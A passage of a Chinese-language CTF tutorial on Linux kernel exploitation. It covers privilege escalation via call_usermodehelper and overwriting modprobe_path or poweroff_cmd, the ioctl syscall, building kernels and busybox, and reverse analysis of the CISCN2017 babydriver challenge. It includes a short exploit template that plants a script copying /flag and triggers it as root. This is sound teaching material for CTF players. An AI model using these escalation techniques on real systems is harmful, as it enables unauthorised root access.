!_InterlockedDecrement(v1) )</span><br><span class="line">      _put_cred(v1);</span><br><span class="line">    <span class="keyword">if</span> ( _InterlockedDecrement(task_cred) )</span><br><span class="line">      <span class="keyword">return</span> <span class="number">0LL</span>;</span><br><span class="line">    _put_cred(task_cred);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0LL</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> ( !_InterlockedDecrement(task_cred) )</span><br><span class="line">    _put_cred(task_cred);</span><br><span class="line">  <span class="keyword">return</span> v1;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<h3 id="符号链接"><a href="#符号链接" class="headerlink" title="符号链接"></a>符号链接</h3><p>如果一个 root 权限的进程会执行一个符号链接的程序，并且该符号链接或者符号链接指向的程序可以由攻击者控制，攻击者就可以实现提权。</p>
<h3 id="call-usermodehelper"><a href="#call-usermodehelper" class="headerlink" title="call_usermodehelper"></a>call_usermodehelper</h3><p><code>call_usermodehelper</code> 是一种内核线程执行用户态应用的方式，并且启动的进程具有 root 权限。因此，如果我们能够控制具体要执行的应用，那就可以实现提权。在内核中，<code>call_usermodehelper</code> 具体要执行的应用往往是由某个变量指定的，因此我们只需要想办法修改掉这个变量即可。不难看出，这是一种典型的数据流攻击方法。一般常用的主要有以下几种方式。</p>
<h4 id="修改-modprobe-path"><a href="#修改-modprobe-path" class="headerlink" title="修改 modprobe_path"></a>修改 modprobe_path</h4><p>修改 modprobe_path 实现提权的基本流程如下</p>
<ol>
<li>获取 modprobe_path 的地址。</li>
<li>修改 modprobe_path 为指定的程序。</li>
<li>触发执行 <code>call_modprobe</code>，从而实现提权 。这里我们可以利用以下几种方式来触发<ol>
<li>执行一个非法的可执行文件。非法的可执行文件需要满足相应的要求。</li>
<li>使用未知协议来触发。</li>
</ol>
</li>
</ol>
<p>这里我们也给出使用 modprobe_path 的模板。</p>
<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// step 1. modify modprobe_path to the target value</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// step 2. create related file</span></span><br><span class="line">system(<span class="string">&quot;echo -ne &#x27;#!/bin/sh\n/bin/cp /flag /home/pwn/flag\n/bin/chmod 777 /home/pwn/flag\ncat flag&#x27; &gt; /home/pwn/catflag.sh&quot;</span>);</span><br><span class="line">system(<span class="string">&quot;chmod +x /home/pwn/catflag.sh&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// step 3. trigger it using unknown executable</span></span><br><span class="line">system(<span class="string">&quot;echo -ne &#x27;\\xff\\xff\\xff\\xff&#x27; &gt; /home/pwn/dummy&quot;</span>);</span><br><span class="line">system(<span class="string">&quot;chmod +x /home/pwn/dummy&quot;</span>);</span><br><span class="line">system(<span class="string">&quot;/home/pwn/dummy&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// step 3. trigger it using unknown protocol</span></span><br><span class="line">socket(AF_INET,SOCK_STREAM,<span class="number">132</span>);</span><br></pre></td></tr></table></figure></div>

<p>在这个过程中，我们着重关注下如何定位 modprobe_path。</p>
<h5 id="直接定位"><a href="#直接定位" class="headerlink" title="直接定位"></a>直接定位</h5><p>由于 modprobe_path 的取值是确定的，所以我们可以直接扫描内存，寻找对应的字符串。这需要我们具有扫描内存的能力。</p>
<h5 id="间接定位"><a href="#间接定位" class="headerlink" title="间接定位"></a>间接定位</h5><p>考虑到 modprobe_path 相对于内核基地址的偏移是固定的，我们可以先获取到内核的基地址，然后根据相对偏移来得到 modprobe_path 的地址。</p>
<p><strong>call_usermodehelper用法</strong></p>
<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;linux/init.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;linux/module.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;linux/types.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;linux/kmod.h&gt;</span></span></span><br><span class="line"></span><br><span class="line">MODULE_LICENSE(<span class="string">&quot;GPL&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="type">static</span> <span class="type">int</span> __init <span class="title function_">call_usermodehelper_init</span><span class="params">(<span class="type">void</span>)</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="type">int</span> ret = <span class="number">-1</span>;</span><br><span class="line">	<span class="comment">/*</span></span><br><span class="line"><span class="comment">	char path[] = &quot;/bin/mkdir&quot;;</span></span><br><span class="line"><span class="comment">	char *argv[] = &#123;path, &quot;-p&quot;, &quot;/home/tester/new/new_dir&quot;, NULL&#125;;</span></span><br><span class="line"><span class="comment">	*/</span></span><br><span class="line">	<span class="type">char</span> path[] = <span class="string">&quot;/bin/bash&quot;</span>;</span><br><span class="line">	<span class="type">char</span> *argv[] = &#123;path, <span class="string">&quot;-c&quot;</span>, <span class="string">&quot;ls&quot;</span>, <span class="string">&quot;-la&quot;</span>, <span class="string">&quot;&gt;&quot;</span>, <span class="string">&quot;/home/tester/ls_output&quot;</span>, <span class="literal">NULL</span>&#125;;</span><br><span class="line">	<span class="type">char</span> *envp[] = &#123;<span class="literal">NULL</span>&#125;;</span><br><span class="line"></span><br><span class="line">	printk(<span class="string">&quot;call_usermodehelper module is starting..!\n&quot;</span>);</span><br><span class="line">	ret = call_usermodehelper(path, argv, envp, UMH_WAIT_PROC);</span><br><span class="line">	printk(<span class="string">&quot;ret=%d\n&quot;</span>, ret);</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">static</span> <span class="type">void</span> __exit <span class="title function_">call_usermodehelper_exit</span><span class="params">(<span class="type">void</span>)</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="type">int</span> ret = <span class="number">-1</span>;</span><br><span class="line">	<span class="type">char</span> path[] = <span class="string">&quot;/bin/rm&quot;</span>;</span><br><span class="line">	<span class="type">char</span> *argv[] = &#123;path, <span class="string">&quot;-r&quot;</span>, <span class="string">&quot;/home/tester/new/new_dir&quot;</span>, <span class="literal">NULL</span>&#125;;</span><br><span class="line">	<span class="type">char</span> *envp[] = &#123;<span class="literal">NULL</span>&#125;;</span><br><span class="line"></span><br><span class="line">	printk(<span class="string">&quot;call_usermodehelper module is starting..!\n&quot;</span>);</span><br><span class="line">	ret = call_usermodehelper(path, argv, envp, UMH_WAIT_PROC);</span><br><span class="line">	printk(<span class="string">&quot;ret=%d\n&quot;</span>, ret);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">module_init(call_usermodehelper_init);</span><br><span class="line">module_exit(call_usermodehelper_exit);</span><br></pre></td></tr></table></figure></div>

<h4 id="修改-poweroff-cmd"><a href="#修改-poweroff-cmd" class="headerlink" title="修改 poweroff_cmd"></a>修改 poweroff_cmd</h4><ol>
<li>修改 poweroff_cmd 为指定的程序。</li>
<li>劫持控制流执行 <code>__orderly_poweroff</code>。</li>
</ol>
<p>关于如何定位 poweroff_cmd，我们可以采用类似于定位 <code>modprobe_path</code> 的方法。</p>
<h3 id="早期的内核"><a href="#早期的内核" class="headerlink" title="早期的内核"></a>早期的内核</h3><p>在早期的时候还有像 <code>kernel null pointer dereference</code> 和 修改 vDSO 段内函数代码为shellcode这样的操作，感兴趣可以查询相关资料，这里就不做介绍了。</p>
<h2 id="ioctl-系统调用"><a href="#ioctl-系统调用" class="headerlink" title="ioctl 系统调用"></a>ioctl 系统调用</h2><p><a class="link"   target="_blank" rel="noopener" href="https://blog.csdn.net/coolwriter/article/details/78242256" >参考链接<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a></p>
<p>在<code>Linux</code>中一切都可以被视为文件，因为一切都可以访问文件的方式进行操作，<code>Linux</code>定义了系统调用<code>ioctl</code>供进程与设备之间进行通信，系统调用<code>ioctl</code>是一个用于设备输入输出操作的一个系统调用，调用方式如下：</p>
<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">ioctl</span><span class="params">(<span class="type">int</span> fd, <span class="type">unsigned</span> <span class="type">long</span> request, ...)</span>;</span><br></pre></td></tr></table></figure></div>

<ul>
<li><code>fd</code>：设备的文件描述符</li>
<li><code>request</code>：请求码</li>
<li>其他参数</li>
</ul>
<p>对于一个提供了 <code>ioctl</code> 通信方式的设备而言，我们可以通过其文件描述符、使用不同的请求码及其他请求参数通过 <code>ioctl</code> 系统调用完成不同的对设备的 <code>I/O</code> 操作。一些没办法归类的函数就统一放在 <code>ioctl</code> 这个函数操作中，通过指定的命令来实现对应的操作。所以，ioctl函数里面都实现了多个的对硬件的操作，通过应用层传入的命令来调用相应的操作。</p>
<h2 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h2><h3 id="内核编译-可选"><a href="#内核编译-可选" class="headerlink" title="内核编译 (可选)"></a>内核编译 (可选)</h3><p><a class="link"   target="_blank" rel="noopener" href="https://mirrors.tuna.tsinghua.edu.cn/kernel/" >清华源<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a></p>
<ol>
<li><strong><code>make menuconfig</code></strong></li>
</ol>
<p>这里我们主要关注调试方面的选项，依次进入到 <code>Kernel hacking -&gt; Compile-time checks and compiler options</code>，然后勾选如下选项<code>Compile the kernel with debug info</code>，以便于调试。不过似乎现在是默认开启的。如果要使用 <code>kgdb</code> 调试内核，则需要选中 <code>KGDB: kernel debugger</code>，并选中 <code>KGDB</code> 下的所有选项。</p>
<blockquote>
<p>报错处理：</p>
<p>【1】</p>
<p>问题概述：</p>
<p><code>make[1]: *** No rule to make target &#39;debian/canonical-certs.pem&#39;, needed by &#39;certs/x509_certificate_list&#39;.  Stop. make: *** [Makefile:1868: certs] Error 2</code></p>
<p>解决方法：</p>
<p>编辑 <code>.config</code> 文件，搜索<code>debian/canonical-certs.pem</code>并把这个字符串删掉。</p>
<p>删除前：</p>
<ul>
<li>CONFIG_SYSTEM_TRUSTED_KEYS&#x3D;”debian&#x2F;canonical-certs.pem”</li>
</ul>
<p>删除后</p>
<ul>
<li>CONFIG_SYSTEM_TRUSTED_KEYS&#x3D;””</li>
</ul>
</blockquote>
<ol start="2">
<li><strong><code>make bzImage -j4</code></strong></li>
</ol>
<blockquote>
<p>注意事项：</p>
<p>注意 gcc 版本问题，<code>4.*</code>一般用 <code>gcc-5</code>，<code>5.*</code>一般用 <code>gcc-7</code>。</p>
<p>gcc多版本共存请参考<a class="link"   target="_blank" rel="noopener" href="https://blog.csdn.net/wr1997/article/details/107737706" >这里<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a></p>
</blockquote>
<ol start="3">
<li><strong>编译成功后</strong></li>
</ol>
<p>我们一般主要关注于如下的文件</p>
<ul>
<li><strong>bzImage：</strong><code>arch/x86/boot/bzImage</code></li>
<li><strong>vmlinux：</strong>源码所在的根目录下。</li>
</ul>
<p>此外，这里给出常见内核文件的介绍。</p>
<ul>
<li><strong>bzImage</strong>：目前主流的 kernel  镜像格式，即 big zImage（即 bz 不是指 bzip2），适用于较大的（大于 512 KB）  Kernel。这个镜像会被加载到内存的高地址，高于 1MB。bzImage 是用 gzip 压缩的，文件的开头部分有 gzip  解压缩的代码，所以我们不能用 gunzip 来解压缩。</li>
<li><strong>zImage</strong>：比较老的 kernel 镜像格式，适用于较小的（不大于 512KB） Kernel。启动时，这个镜像会被加载到内存的低地址，即内存的前 640 KB。zImage 也不能用 gunzip 来解压缩。</li>
<li><strong>vmlinuz</strong>：vmlinuz 不仅包含了压缩后的 vmlinux，还包含了 gzip 解压缩的代码。实际上就是 zImage 或者 bzImage 文件。该文件是  bootable 的。 bootable 是指它能够把内核加载到内存中。对于 Linux 系统而言，该文件位于 &#x2F;boot  目录下。该目录包含了启动系统时所需要的文件。</li>
<li><strong>vmlinux</strong>：静态链接的 Linux kernel，以可执行文件的形式存在，尚未经过压缩。该文件往往是在生成 vmlinuz 的过程中产生的。该文件适合于调试。但是该文件不是 bootable 的。</li>
<li><strong>vmlinux.bin</strong>：也是静态链接的 Linux kernel，只是以一个可启动的 (bootable) 二进制文件存在。所有的符号信息和重定位信息都被删除了。生成命令为：<code>objcopy -O binary vmlinux vmlinux.bin</code>。</li>
<li><strong>uImage</strong>：uImage 是 U-boot 专用的镜像文件，它是在 zImage 之前加上了一个长度为 0x40 的 tag 而构成的。这个 tag 说明了这个镜像文件的类型、加载位置、生成时间、大小等信息。</li>
</ul>
<h3 id="编译-busybox-可选"><a href="#编译-busybox-可选" class="headerlink" title="编译 busybox (可选)"></a>编译 busybox (可选)</h3><p>可以在 <a class="link"   target="_blank" rel="noopener" href="https://busybox.net/" >busybox官网<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a> 下载源码解压安装。</p>
<div class="code-container" data-rel="Cpp"><figure class="iseeu highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">wget https:<span class="comment">//busybox.net/downloads/busybox-1.36.1.tar.bz2</span></span><br><span class="line">tar -jxvf busybox<span class="number">-1.36</span><span class="number">.1</span>.tar.bz2</span><br></pre></td></tr></table></figure></div>

<p><strong>make menuconfig</strong></p>
<ol>
<li>进入 <code>setting</code> 选择静态编译。</li>
<li>设置安装目录(<code>Destination path for &#39;make install&#39;</code>)，可以默认也可以改为 <code>./rootfs</code></li>
</ol>
<p><strong>make -j4 &amp;&amp; make install</strong></p>
<p>源目录下的 <code>rootfs</code> 文件夹里便是我们编译好的文件系统。</p>
<h3 id="Kernel-Pwn-一般流程"><a href="#Kernel-Pwn-一般流程" class="headerlink" title="Kernel Pwn 一般流程"></a>Kernel Pwn 一般流程</h3><p>我们拿 <a class="link"   target="_blank" rel="noopener" href="https://github.com/ctf-wiki/ctf-challenges/tree/master/pwn/kernel/CISCN2017-babydriver" >CISCN2017-babykernel<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a> 这道题为例。</p>
<h4 id="基础概念"><a href="#基础概念" class="headerlink" title="基础概念"></a>基础概念</h4><p>解压后有三个文件：</p>
<ul>
<li><code>boot.sh</code>：启动脚本；</li>
<li><code>bzImage</code>：内核镜像；</li>
<li><code>rootfs.cpio</code>：文件系统；</li>
</ul>
<p><strong>启动脚本</strong></p>
<div class="code-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">#</span><span class="language-bash">!/bin/bash</span></span><br><span class="line">qemu-system-x86_64 \</span><br><span class="line">  -initrd rootfs.cpio \</span><br><span class="line">  -kernel bzImage \</span><br><span class="line">  -append &#x27;console=ttyS0 root=/dev/ram oops=panic panic=1&#x27; \</span><br><span class="line">  -enable-kvm \</span><br><span class="line">  -monitor /dev/null -m 64M \</span><br><span class="line">  --nographic \</span><br><span class="line">  -smp cores=1,threads=1 \</span><br><span class="line">  -cpu kvm64,+smep</span><br></pre></td></tr></table></figure></div>

<p>在用 <code>qemu</code> 启动内核时，常用的选项如下</p>
<ul>
<li><code>-m</code>， 指定 RAM 大小，默认 384M</li>
<li><code>-kernel</code>，指定内核镜像文件 bzImage 路径</li>
<li><code>-initrd</code>，设置内核启动的内存文件系统</li>
<li><code>-smp [cpus=]n[,cores=cores][,threads=threads][,dies=dies][,sockets=sockets][,maxcpus=maxcpus]</code>，指定使用到的核数。</li>
<li><code>-cpu</code>，指定指定要模拟的处理器架构，可以同时开启一些保护，如   <ul>
<li><code>+smap</code>，开启 smap 保护</li>
<li><code>+smep</code>，开启 smep 保护</li>
</ul>
</li>
<li><code>-nographic</code>，表示不需要图形界面</li>
<li><code>-monitor</code>，对 qemu 提供的控制台进行重定向，如果没有设置的话，可以直接进入控制台。<code>-monitor /dev/null</code> 后 <code>Ctrl + c</code> 可以直接退出 qemu 。</li>
<li><code>-append</code>，附加选项   <ul>
<li><code>nokaslr</code> 关闭随机偏移</li>
<li><code>pti=on/off</code> 开启&#x2F;关闭 KPTI</li>
<li><code>console=ttyS0</code>，和 <code>nographic</code> 一起使用，启动的界面就变成了当前终端。</li>
</ul>
</li>
</ul>
<p>安装 <code>qemu</code> 后运行 <code>boot.sh</code> 即可启动 <code>linux</code> 系统。</p>
<p><strong>内核镜像</strong></p>
<p><code>bzImage</code> 便是我们上面提到的内核镜像，可以用 <code>file</code> 检查内核版本。</p>
<div class="code-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">file bzImage</span> </span><br><span class="line">bzImage: Linux kernel x86 boot executable bzImage, version 4.4.72 (atum@ubuntu) #1 SMP Thu Jun 15 19:52:50 PDT 2017, RO-rootFS, swap_dev 0X6, Normal VGA</span><br></pre></td></tr></table></figure></div>

<p><strong>文件系统</strong></p>
<p>启动的文件系统，可以通过 <code>cpio</code> 进行解压（<code>cpio -idmv &lt; rootfs.cpio</code>），不过有的题目可能会把一些其它压缩格式的文件系统后缀改成 <code>cpio</code>。可以选择右击然后<code>Extract Here</code>。有时右键解压的文件系统会导致内核启动不了，目前用 <code>binwalk -e</code> 解压的是没问题的 。</p>
<h4 id="逆向分析"><a href="#逆向分析" class="headerlink" title="逆向分析"></a>逆向分析</h4><p><strong>分析init文件</strong></p>
<div class="code-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">#</span><span class="language-bash">!/bin/sh</span></span><br><span class="line">mount -t proc none /proc</span><br><span class="line">mount -t sysfs none /sys</span><br><span class="line">mount -t devtmpfs devtmpfs /dev</span><br><span class="line">chown root:root flag</span><br><span class="line">chmod 400 flag</span><br><span class="line">exec 0&lt;/dev/console</span><br><span class="line">exec 1&gt;/dev/console</span><br><span class="line">exec 2&gt;/dev/console</span><br><span class="line"></span><br><span class="line">insmod /lib/modules/4.4.72/babydriver.ko</span><br><span class="line">chmod 777 /dev/babydev</span><br><span class="line">echo -e &quot;\nBoot took $(cut -d&#x27; &#x27; -f1 /proc/uptime) seconds\n&quot;</span><br><span class="line">setsid cttyhack setuidgid 1000 sh</span><br><span class="line"></span><br><span class="line">umount /proc</span><br><span class="line">umount /sys</span><br><span class="line">poweroff -d 0 -f</span><br></pre></td></tr></table></figure></div>

<p><code>init</code> 是 linux 启动时的初始化文件，主要做一些环境配置。通过分析 <code>init</code> 文件可以获取一些重要信息，另外可以通过修改 <code>init</code> 文件增加调试分析的便捷性。</p>
<ul>
<li>从 <code>init</code> 脚本中得知 需要分析的驱动文件的所在路径为 <code>/lib/modules/4.4.72/babydriver.ko</code> ，另外该驱动可能对应设备 <code>/dev/babydev</code> ，具体是否存在这种对应关系还需要分析 <code>babydriver.ko</code> 中是否有注册 <code>babydev</code> 设备的操作。</li>
<li><code>setsid cttyhack setuidgid 1000 sh</code> 这条命令决定以非 root 权限启动命令行，如果想要以 root 权限启动命令行需要将 1000 改为 0 。</li>
<li>有的题目可能存在 <code>poweroff -d 0 -f &amp;</code> 命令用来定时关机，在本地调试的时候最好注释掉。</li>
</ul>
<p><strong>分析 babydriver.ko</strong></p>
<div class="code-container" data-rel="Cpp"><figure class="iseeu highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">int</span> __fastcall <span class="title">babyopen</span><span class="params">(inode *inode, file *filp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  _fentry__(inode, filp);</span><br><span class="line">  babydev_struct.device_buf = (<span class="type">char</span> *)<span class="built_in">kmem_cache_alloc_trace</span>(kmalloc_caches[<span class="number">6</span>], <span class="number">0x24000C0</span>LL, <span class="number">0x40</span>LL);</span><br><span class="line">  babydev_struct.device_buf_len = <span class="number">0x40</span>LL;</span><br><span class="line">  <span class="built_in">printk</span>(<span class="string">&quot;device open\n&quot;</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p><code>babyopen()</code> 函数中，申请了一个 <code>0x40</code> 大小的堆，然后将堆地址和大小赋给 <code>babydev_struct</code> 这个结构体的成员。<code>babydev_struct</code>是一个全局变量，未设置任何保护措施。因此，当有两个用户同时打开<code>open(&quot;/dev/babydev&quot;,2)</code>该设备节点时，后一个 <code>open</code> 操作，将覆盖<code>babydev_struct.device_buf</code>上的值，导致两个用户（不同fd）指向同一堆块。</p>
<hr>
<div class="code-container" data-rel="Cpp"><figure class="iseeu highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">ssize_t</span> __fastcall <span class="title">babyread</span><span class="params">(file *filp, <span class="type">char</span> *buffer, <span class="type">size_t</span> length, <span class="type">loff_t</span> *offset)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="type">size_t</span> v4; <span class="comment">// rdx</span></span><br><span class="line">  <span class="type">ssize_t</span> result; <span class="comment">// rax</span></span><br><span class="line">  <span class="type">ssize_t</span> v6; <span class="comment">// rbx</span></span><br><span class="line"></span><br><span class="line">  _fentry__(filp, buffer);</span><br><span class="line">  <span class="keyword">if</span> ( !babydev_struct.device_buf )</span><br><span class="line">    <span class="keyword">return</span> <span class="number">-1LL</span>;</span><br><span class="line">  result = <span class="number">-2LL</span>;</span><br><span class="line">  <span class="keyword">if</span> ( babydev_struct.device_buf_len &gt; v4 )</span><br><span class="line">  &#123;</span><br><span class="line">    v6 = v4;</span><br><span class="line">    <span class="built_in">copy_to_user</span>(buffer);</span><br><span class="line">    <span class="keyword">return</span> v6;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p><code>babyread()</code>函数逻辑简单，判断<code>babydev_struct.device_buf_len</code>是否大于用户态传入的长度(rdx)，如果满足条件则将<code>babydev_struct.device_buf</code>指向的内容拷贝到用户态。</p>
<hr>
<div class="code-container" data-rel="Cpp"><figure class="iseeu highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">ssize_t</span> __fastcall <span class="title">babywrite</span><span class="params">(file *filp, <span class="type">const</span> <span class="type">char</span> *buffer, <span class="type">size_t</span> length, <span class="type">loff_t</span> *offset)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="type">size_t</span> v4; <span class="comment">// rdx</span></span><br><span class="line">  <span class="type">ssize_t</span> result; <span class="comment">// rax</span></span><br><span class="line">  <span class="type">ssize_t</span> v6; <span class="comment">// rbx</span></span><br><span class="line"></span><br><span class="line">  _fentry__(filp, buffer);</span><br><span class="line">  <span class="keyword">if</span> ( !babydev_struct.device_buf )</span><br><span class="line">    <span class="keyword">return</span> <span class="number">-1LL</span>;</span><br><span class="line">  result = <span class="number">-2LL</span>;</span><br><span class="line">  <span class="keyword">if</span> ( babydev_struct.device_buf_len &gt; v4 )</span><br><span class="line">  &#123;</span><br><span class="line">    v6 = v4;</span><br><span class="line">    <span class="built_in">copy_from_user</span>();</span><br><span class="line">    <span class="keyword">return</span> v6;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p><code>babywrite()</code>函数跟<code>babyread()</code>函数类似，判断条件通过后，将用户态的数据拷贝给<code>babydev_struct.device_buf</code>。</p>
<hr>
<div class="code-container" data-rel="Cpp"><figure class="iseeu highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">__int64 __fastcall <span class="title">babyioctl</span><span class="params">(file *filp, <span class="type">unsigned</span> <span class="type">int</span> command, <span class="type">unsigned</span> __int64 arg)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="type">size_t</span> v3; <span class="comment">// rdx</span></span><br><span class="line">  <span class="type">size_t</span> v4; <span class="comment">// rbx</span></span><br><span class="line"></span><br><span class="line">  _fentry__(filp, command);</span><br><span class="line">  v4 = v3;</span><br><span class="line">  <span class="keyword">if</span> ( command == <span class="number">0x10001</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">kfree</span>(babydev_struct.device_buf);</span><br><span class="line">    babydev_struct.device_buf = (<span class="type">char</span> *)_kmalloc(v4, <span class="number">0x24000C0</span>LL);</span><br><span class="line">    babydev_struct.device_buf_len = v4;</span><br><span class="line">    <span class="built_in">printk</span>(<span class="string">&quot;alloc done\n&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0LL</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">printk</span>(&amp;unk_2EB);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">-22LL</span>;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p><code>babyioctl()</code>只有一个分支（command），它先将<code>babydev_struct.device_buf</code>指向的堆块释放掉，然后根据用户态传入的<code>arg</code>参数申请任意大小堆块，并更新<code>babydev_struct</code>结构体中两个成员。</p>
<hr>
<div class="code-container" data-rel="Cpp"><figure class="iseeu highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">int</span> __fastcall <span class="title">babyrelease</span><span class="params">(inode *inode, file *filp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  _fentry__(inode, filp);</span><br><span class="line">  <span class="built_in">kfree</span>(babydev_struct.device_buf);</span><br><span class="line">  <span class="built_in">printk</span>(<span class="string">&quot;device release\n&quot;</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

